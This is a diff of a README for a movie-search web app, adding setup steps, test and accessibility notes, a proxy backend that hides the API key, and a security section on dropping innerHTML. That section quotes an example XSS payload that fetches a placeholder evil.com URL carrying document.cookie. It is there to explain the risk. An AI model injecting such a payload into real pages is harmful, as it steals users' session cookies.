@@ -37,7 +37,19 @@ The server will run on `http://localhost:3000`
 
 ### Frontend
 
-Open `index.html` in your browser. The frontend will connect to the proxy server running on port 3000.
+1. Install dependencies (if not already done):
+```bash
+npm install
+```
+
+2. Start the frontend server:
+```bash
+npm run serve
+```
+
+3. Open `http://localhost:8000` (a different port may be used if 8000 is not available) in your browser. The frontend will connect to the proxy server running on port 3000.
+
+**Note**: The frontend now uses ES modules, so it must be served over HTTP (not opened directly as a file anymore).
 
 ## Features
 
@@ -49,7 +61,9 @@ Open `index.html` in your browser. The frontend will connect to the proxy server
 
 - `index.html` - Main page structure
 - `styles.css` - Responsive styling
-- `script.js` - Application logic
+- `script.js` - Application logic (ES modules)
+- `tests/` - Unit tests (Vitest)
+- `package.json` - Frontend dependencies and scripts
 - `proxy/` - Backend proxy server (Node.js/Express)
   - `server.js` - Express server with OMDB API endpoints
   - `.env` - Environment variables (API keys, not committed to git)
@@ -72,6 +86,23 @@ I decided to go with a bottomsheet container (inspired by my experience with rea
 ### Skeleton Loading
 Shimmer-animated placeholders shown immediately while data loads. Provides instant visual feedback and reduces perceived load time.
 
+### ES Modules
+Frontend code uses now ES modules for better code organization, testability, but mainly for accurate test coverage reporting. And now because of this change it requires serving over HTTP (use `npm run serve`).
+
+### Tests
+Unit tests for core functions and integration tests for user flows (Completed 84 tests with a 94% coverage)
+
+## Accessibility
+- ARIA labels and semantic roles
+- Keyboard navigation (Tab, Enter, Space, Escape)
+- Screen reader announcements
+- Focus trap in modal dialogs
+
+## Backend
+I created a very simple backend server to serve as a proxy as secure the api_key that was previouly exposed and hardcoded in the frontend.
+
+## Removing use of "innerHTML"
+This was an important security change, because innerHTML parses HTML strings, which can execute malicious scripts. For example, if OMDB or any other third-party service sends malicious content like `Title: "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"` instead of a regular string, innerHTML could allow attackers to exploit and steal user information.
 
 ## Potential Improvements
 
@@ -82,4 +113,3 @@ Shimmer-animated placeholders shown immediately while data loads. Provides insta
 - **Keyboard Navigation**: Support arrow keys and Enter for navigating and selecting movies
 - **Error Handling**: Add retry mechanisms and better error messages for failed API calls
 - **Accessibility**: Improve ARIA labels, keyboard navigation, and screen reader support
-- **Testing**: Add unit tests for core functions and integration tests for user flows
